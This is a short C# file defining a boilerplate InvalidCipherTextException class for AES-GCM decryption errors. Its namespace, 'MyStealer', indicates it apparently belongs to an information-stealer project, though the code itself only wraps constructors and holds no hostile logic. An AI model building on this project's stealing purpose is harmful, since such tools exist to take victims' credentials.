using System;
using System.Runtime.Serialization;
using System.Security.Cryptography;

namespace MyStealer.Utils.BcAesGcm
{
    /// <summary>This exception is thrown whenever we find something we don't expect in a message.</summary>
    [Serializable]
    public class InvalidCipherTextException
        : CryptographicException
    {
        public InvalidCipherTextException()
        {
        }

        public InvalidCipherTextException(string message)
            : base(message)
        {
        }

        public InvalidCipherTextException(string message, Exception innerException)
            : base(message, innerException)
        {
        }

        protected InvalidCipherTextException(SerializationInfo info, StreamingContext context)
            : base(info, context)
        {
        }
    }
}
